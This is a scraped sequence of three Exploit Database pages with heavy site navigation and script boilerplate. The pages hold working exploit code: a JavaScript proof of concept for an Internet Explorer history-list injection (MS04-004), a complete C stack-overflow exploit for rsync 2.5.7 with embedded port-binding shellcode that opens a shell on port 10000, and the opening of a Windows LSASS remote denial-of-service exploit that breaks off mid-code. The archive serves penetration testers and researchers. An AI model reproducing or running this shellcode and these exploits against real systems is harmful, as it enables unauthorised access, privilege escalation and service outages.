Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 151
Microsoft Internet Explorer - URL Injection in History List (MS04-004) - Windows remote Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Internet Explorer - URL Injection in History List (MS04-004)EDB-ID:151CVE:2003-1026EDB Verified:Author:Andreas SandbladType:remoteExploit:/Platform:WindowsDate:2004-02-04Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED// Andreas Sandblad, 2004-02-03, patched by MS04-004// Name:     payload// Purpose:  Run payload code called from Local Machine zone.//           The code may be arbitrary such as executing shell commands.//           This demo simply creates a harmless textfile on the desktop.function payload() {file = "sandblad.txt";o = new ActiveXObject("ADODB.Stream");o.Open();o.Type=2;o.Charset="ascii";o.WriteText("You are vulnerable!");o.SaveToFile(file, 2);o.Close();alert("File "+file+" created on desktop!");}// Name:     trigger// Purpose:  Inject javascript url in history list and run payload//           function when the user hits the backbutton.function trigger(len) {if (history.length != len)payload();elsereturn "<title>-</title><bodyonload=external.NavigateAndFind('res:','','')>";}// Name:    backbutton// Purpose: Run backbutton exploit.function backbutton() {location = 'javascript:'+trigger+payload+'trigger('+history.length+')';}// Launch backbutton exploit on loadif (confirm("Press OK to run backbutton exploit!"))backbutton();# milw0rm.com [2004-02-04]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 152
rsync 2.5.7 - Local Stack Overflow / Local Privilege Escalation - Linux local Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDrsync 2.5.7 - Local Stack Overflow / Local Privilege EscalationEDB-ID:152CVE:2004-2093EDB Verified:Author:Abhisek DattaType:localExploit:/Platform:LinuxDate:2004-02-13Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/** rsync <= 2.5.7 Local Exploit* Saved EIP on stack is overwritten with address of shellcode in memory* Generally rsync is not setuid or setgid so just a local shell is of no use* So i used a portbinding shellcode as a PoC of a different attack vector.* RET is calculated dynamically so payload can be changed just by changing shellcode* Tested on:* [eos@Matrix my]$ uname -a* Linux Matrix 2.4.18-14 #1 Wed Sep 4 13:35:50 EDT 2002 i686 i686 i386 GNU/Linux* coded by: abhisek linuxmail org* Special Thanks: n2n, Hirosh Joseph*/#include <stdio.h>/* Includes for code to daemonize */#include <signal.h>#include <sys/wait.h>#include <sys/stat.h>#include <fcntl.h>/****/#define PATH "/usr/local/bin/rsync"#define BUFF_SIZE 100//#define RET 0xbffffdfb/* 88 bytes portbinding shellcode - linux-x86* - by bighawk (bighawk warfare com)** This shellcode binds a shell on port 10000* stdin, stdout and stderr are dupped. accept() arguments are sane.*/char shellcode[] ="\x31\xdb" // xor ebx, ebx"\xf7\xe3" // mul ebx"\xb0\x66" // mov al, 102"\x53" // push ebx"\x43" // inc ebx"\x53" // push ebx"\x43" // inc ebx"\x53" // push ebx"\x89\xe1" // mov ecx, esp"\x4b" // dec ebx"\xcd\x80" // int 80h"\x89\xc7" // mov edi, eax"\x52" // push edx"\x66\x68\x27\x10" // push word 4135"\x43" // inc ebx"\x66\x53" // push bx"\x89\xe1" // mov ecx, esp"\xb0\x10" // mov al, 16"\x50" // push eax"\x51" // push ecx"\x57" // push edi"\x89\xe1" // mov ecx, esp"\xb0\x66" // mov al, 102"\xcd\x80" // int 80h"\xb0\x66" // mov al, 102"\xb3\x04" // mov bl, 4"\xcd\x80" // int 80h"\x50" // push eax"\x50" // push eax"\x57" // push edi"\x89\xe1" // mov ecx, esp"\x43" // inc ebx"\xb0\x66" // mov al, 102"\xcd\x80" // int 80h"\x89\xd9" // mov ecx, ebx"\x89\xc3" // mov ebx, eax"\xb0\x3f" // mov al, 63"\x49" // dec ecx"\xcd\x80" // int 80h"\x41" // inc ecx"\xe2\xf8" // loop lp"\x51" // push ecx"\x68\x6e\x2f\x73\x68" // push dword 68732f6eh"\x68\x2f\x2f\x62\x69" // push dword 69622f2fh"\x89\xe3" // mov ebx, esp"\x51" // push ecx"\x53" // push ebx"\x89\xe1" // mov ecx, esp"\xb0\x0b" // mov al, 11"\xcd\x80"; // int 80h/* Shellcode by n2n [n2n@linuxmail.org] used for initial testing *//*char shellcode[]=// setreuid(geteuid(),geteuid()), no use unless rsync is setuid, usually its not"\x31\xc0\xb0\x31\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x46\xcd\x80"// setregid(getegid(),getegid())"\x31\xc0\xb0\x32\xcd\x80\x93\x89\xd9\x31\xc0\xb0\x47\xcd\x80"// exec /bin/sh"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"// exit()"\x31\xdb\x89\xd8\xb0\x01\xcd\x80";*/void handler(int sig) {int stat;pid_t pid;while ((pid = waitpid(-1, &stat, WNOHANG)) > 0) { }return;}void go_daemon() {int i;if(fork())exit (0);setsid();i=open("/dev/null",O_RDWR);dup2(i, 0);dup2(i, 1);dup2(i, 2);close(i);for (i=1;i<64;i++)signal(i,SIG_IGN);signal(SIGCHLD,handler);}int main(int argc,char *argv[]) {char *buffer;int size=BUFF_SIZE,i;//unsigned long ret_addr=0xbffffffa;unsigned long ret_addr=0xbffffffa;//char *expbuff;char *arg="localhost::rsync:getaddrinfo:XXX";if(argc > 2) {printf("USAGE:\n%s BUFF_SIZE\n",argv[0]);exit(1);}if(argc == 2)size=atoi(argv[1]);buffer=(char*)malloc(size);if(!buffer) {printf("Error allocating memory on heap\n");exit(1);}ret_addr -= strlen(PATH);ret_addr -= strlen(shellcode);//ret_addr -= strlen(arg);/*expbuff=(char*)malloc(strlen(shellcode)+100);if(!expbuff) {printf("Error allocating memory on heap\n");exit(1);}memset(expbuff,0x90,strlen(shellcode)+100);memcpy(expbuff+80,shellcode,strlen(shellcode));expbuff[strlen(expbuff)-1]=0x00;*/for(i=0;i<size;i+=4)*(unsigned long*)(buffer+i)=ret_addr;memcpy(buffer,"XXX:",4);buffer[strlen(buffer)-1]=0x00;printf("Using BUFF_SIZE=%d\nRET=%p\n",size,ret_addr);setenv("RSYNC_PROXY",buffer,1);setenv("EGG",shellcode,1);/* Daemonizing and executing /usr/local/bin/rsync */go_daemon();execl(PATH,PATH,arg,NULL);return 0;}// milw0rm.com [2004-02-13]CopyTags:Advisory/Source:LinkDownloadsCertificationsTrainingProfessional ServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPAdvanced Web Attacks and Exploitation (AWAE)Advanced Attack SimulationKali Linux Revealed BookOSCEOffensive Security Wireless Attacks (WiFu)Application Security AssessmentOSEECracking the Perimeter (CTP)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux TrainingDownloadsKali LinuxKali NetHunterKali Linux Revealed BookCertificationsOSCPOSWPOSCEOSEEOSWEKLCPTrainingPenetration Testing with Kali Linux (PWK)Advanced Web Attacks and Exploitation (AWAE)Offensive Security Wireless Attacks (WiFu)Cracking the Perimeter (CTP)Metasploit Unleashed (MSFU)Free Kali Linux trainingPro ServicesPenetration TestingAdvanced Attack SimulationApplication Security AssessmentExploit Database by Offensive SecurityTermsPrivacyAbout UsFAQCookies©Copyright 2019, Exploit DatabaseAbout The Exploit Database×The Exploit Database is maintained by Offensive Security, an information security training companythat provides various Information Security Certifications as well as high end penetration testing services. The Exploit Database is anon-profit project that is provided as a public service by Offensive Security.The Exploit Database is a CVEcompliant archive of public exploits and corresponding vulnerable software,developed for use by penetration testers and vulnerability researchers. Our aim is to servethe most comprehensive collection of exploits gathered through direct submissions, mailinglists, as well as other public sources, and present them in a freely-available andeasy-to-navigate database. The Exploit Database is a repository for exploits andproof-of-concepts rather than advisories, making it a valuable resource for those who needactionable data right away.The Google Hacking Database (GHDB)is a categorized index of Internet search engine queries designed to uncover interesting,and usually sensitive, information made publicly available on the Internet. In most cases,this information was never meant to be made public but due to any number of factors thisinformation was linked in a web document that was crawled by a search engine thatsubsequently followed that link and indexed the sensitive information.The process known as Google Hacking was popularized in 2000 by JohnnyLong, a professional hacker, who began cataloging these queries in a database known as theGoogle Hacking Database. His initial efforts were amplified by countless hours of communitymember effort, documented in the book Google Hacking For Penetration Testers and popularisedby a barrage of media attention and Johnnys talks on the subject such as this early talkrecorded at DEFCON 13. Johnny coined the term Googledork to referto a foolish or inept person as revealed by Google. This was meant to draw attention tothe fact that this was not a Google problem but rather the result of an oftenunintentional misconfiguration on the part of a user or a program installed by the user.Over time, the term dork became shorthand for a search query that located sensitiveinformation and dorks were included with may web application vulnerability releases toshow examples of vulnerable web sites.After nearly a decade of hard work by the community, Johnny turned the GHDBover to Offensive Security in November 2010, and it is now maintained asan extension of the Exploit Database. Today, the GHDB includes searches forother online search engines such as Bing,and other online repositories like GitHub,producing different, yet equally valuable results.CloseOffensive Security Resources×DownloadsCertificationsTrainingServicesKali LinuxOSCPPenetration Testing with Kali Linux (PWK)Penetration TestingKali NetHunterOSWPOffensive Security Wireless Attacks (WiFu)Advanced Attack SimulationKali Linux Revealed BookOSCECracking the Perimeter (CTP)Application Security AssessmentOSEEAdvanced Web Attacks (AWAE)OSWEMetasploit Unleashed (MSFU)KLCPFree Kali Linux trainingCloseSearch The Exploit Database×TitleCVETypedoslocalremoteshellcodepaperswebappsPlatformAIXASPBSDBSD_PPCBSD_x86BSDi_x86CGIFreeBSDFreeBSD_x86FreeBSD_x86-64GeneratorHardwareHP-UXIRIXJSPLinuxLinux_MIPSLinux_PPCLinux_SPARCLinux_x86Linux_x86-64MINIXMultipleNetBSD_x86NovellOpenBSDOpenBSD_x86OSX_PPCOSXPHPPlan9QNXSCOSCO_x86SolarisSolaris_SPARCSolaris_x86Tru64ULTRIXUnixUnixWareWindows_x86Windows_x86-64WindowsARMCFMNetwareSuperH_SH4JavaBeOSImmunixPalm_OSAtheOSiOSAndroidXMLPerlPythonSystem_zJSONASHXRubyASPXmacOSLinux_CRISv32eZineMagazineNodeJSAlphaSolaris_MIPSLuawatchOSVxWorksAuthorContentPortagWordPress CoreMetasploit Framework (MSF)WordPress PluginSQL Injection (SQLi)Cross-Site Scripting (XSS)File Inclusion (LFI/RFI)Cross-Site Request Forgery (CSRF)Denial of Service (DoS)Code InjectionCommand InjectionAuthentication Bypass / Credentials Bypass (AB/CB)Client SideUse After Free (UAF)Out Of BoundsRemoteLocalXML External Entity (XXE)Integer OverflowServer-Side Request Forgery (SSRF)Race ConditionNULL Pointer DereferenceMalwareBuffer OverflowHeap OverflowType ConfusionObject InjectionBug ReportConsolePwn2OwnTraversalDeserializationVerifiedHas AppNo MetasploitSearch.dataTables_filter input {font-size: 16px;}window.addEventListener('popstate', () => {location.reload();}, false);$(function () {$('[data-toggle="tooltip"]').tooltip()})function getParameterByName(name, url) {if (!url) url = window.location.href;name = name.replace(/[\[\]]/g, "\\$&");var regex = new RegExp("[?&]" + name + "(=([^&#]*)|&|#|$)"),results = regex.exec(url);if (!results) return null;if (!results[2]) return '';return decodeURIComponent(results[2].replace(/\+/g, " "));}function removeURLParameter(url, parameter) {//prefer to use l.search if you have a location/link objectvar urlparts= url.split('?');if (urlparts.length>=2) {var prefix= encodeURIComponent(parameter)+'=';var pars= urlparts[1].split(/[&;]/g);//reverse iteration as may be destructivefor (var i= pars.length; i-- > 0;) {//idiom for string.startsWithif (pars[i].lastIndexOf(prefix, 0) !== -1) {pars.splice(i, 1);}}url= urlparts[0] + (pars.length > 0 ? '?' + pars.join('&') : "");window.history.pushState('', document.title, url);return url;} else {window.history.pushState('', document.title, url);return url;}}function showFilters() {var x = document.getElementById("exploitFiltersCard");if (x.style.display === "none") {x.style.display = "block";} else {x.style.display = "none";}}function updateQueryString(key, value, url) {if (!url) url = window.location.href;var re = new RegExp("([?&])" + key + "=.*?(&|#|$)(.*)", "gi"),hash;if (re.test(url)) {if (typeof value !== 'undefined' && value !== null)return url.replace(re, '$1' + key + "=" + value + '$2$3');else {hash = url.split('#');url = hash[0].replace(re, '$1$3').replace(/(&|\?)$/, '');if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}}else {if (typeof value !== 'undefined' && value !== null) {var separator = url.indexOf('?') !== -1 ? '&' : '?';hash = url.split('#');url = hash[0] + separator + key + '=' + value;if (typeof hash[1] !== 'undefined' && hash[1] !== null)url += '#' + hash[1];window.history.pushState('', document.title, url);return url;}elsewindow.history.pushState('', document.title, url);return url;}}$('#search').submit(function() {$(this).find(":input").filter(function(){ return !this.value; }).attr("disabled", "disabled");return true; // ensure form still submits});// Un-disable form fields when page loads, in case they click back after submission$('#search').find( ":input" ).prop( "disabled", false );// If the ajax call fails, throw the error to the console instead of// popping up an alert to the user$.fn.dataTable.ext.errMode = 'throw';
#~ 153
Microsoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007) - Windows dos Exploit#optanon ul#optanon-menu li { background-color:  !important }#optanon ul#optanon-menu li.menu-item-selected { background-color:  !important }#optanon #optanon-popup-wrapper .optanon-white-button-middle { background-color: #C6510C !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle { background-color: #C6510C !important; border-color: #C6510C !important; }#optanon #optanon-popup-wrapper .optanon-white-button-middle button { color: #ffffff !important }.optanon-alert-box-wrapper .optanon-alert-box-button-middle button { color: #ffffff !important }#optanon #optanon-popup-bottom { background-color: #F2F2F2 !important }#optanon.modern #optanon-popup-top, #optanon.modern #optanon-popup-body-left-shading { background-color: #F2F2F2 !important }.optanon-alert-box-wrapper { background-color:#0b264f !important }.optanon-alert-box-wrapper .optanon-alert-box-bg p { color: !important }function OptanonWrapper() { }window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create', 'UA-1981501-4', { 'cookieDomain': 'www.exploit-db.com' } );ga('send', 'pageview');.rbtn {border: 2px solid white;border-radius: 20px;color: black;padding: 8px;cursor: pointer;}.rsuccess {border-color: white;color: white;}.rsuccess:hover {background-color: white;color: #165283;}.rprimary {border-color: #ca4f0c;color: #ca4f0c;}.rprimary:hover {background-color: #ca4f0c;color: white;}.action-link[data-v-7653bbea] {cursor: pointer;}.action-link[data-v-04b7805e] {cursor: pointer;}.action-link[data-v-7d22a50a] {cursor: pointer;}Exploit DatabaseExploitsGHDBPapersShellcodesSearch EDBSearchSploit ManualSubmissionsOnline TrainingPWKPenetration Testing with KaliAWAEAdvanced Web AttacksWiFuWireless AttacksOffsec ResourcesStatsAbout UsAbout Exploit-DBExploit-DB HistoryFAQSearchGET CERTIFIEDMicrosoft Windows - ASN.1 'LSASS.exe' Remote Denial of Service (MS04-007)EDB-ID:153CVE:2003-0818EDB Verified:Author:Christophe DevineType:dosExploit:/Platform:WindowsDate:2004-02-14Vulnerable App:Become a Certified Penetration TesterEnroll inPenetration Testing with Kali Linux, the courserequired to become anOffensive Security Certified Professional (OSCP)GET CERTIFIED/**  MS04-007 Exploit LSASS.EXE Win2k Pro Remote Denial-of-Service**  Copyright (C) 2004  Christophe Devine**  This program is free software; you can redistribute it and/or modify*  it under the terms of the GNU General Public License as published by*  the Free Software Foundation; either version 2 of the License, or*  (at your option) any later version.**  This program is distributed in the hope that it will be useful,*  but WITHOUT ANY WARRANTY; without even the implied warranty of*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the*  GNU General Public License for more details.**  You should have received a copy of the GNU General Public License*  along with this program; if not, write to the Free Software*  Foundation, Inc., 59 Temple Place, Suite 330, Boston, MA  02111-1307  USA*//**   > MS04-007-dos.exe 10.0.0.1 445*   connect failed**   > nbtstat -A 10.0.0.1*   [..]*       SERVER3        <20>  UNIQUE      Registered*   [..]*   > MS04-007-dos.exe 10.0.0.1 139 SERVER3*   > MS04-007-dos.exe 10.0.0.1 139 SERVER3*   >**   if the exploit works, LSASS gets killed,*   and after 1mn the server reboots.**///#define WIN32#ifdef WIN32#include <winsock2.h>#include <windows.h>#else#include <sys/types.h>#include <sys/socket.h>#include <netinet/in.h>#include <netdb.h>#endif#include <stdio.h>/****************************************************************/unsigned char netbios_sess_req[] =/* NetBIOS Session Request 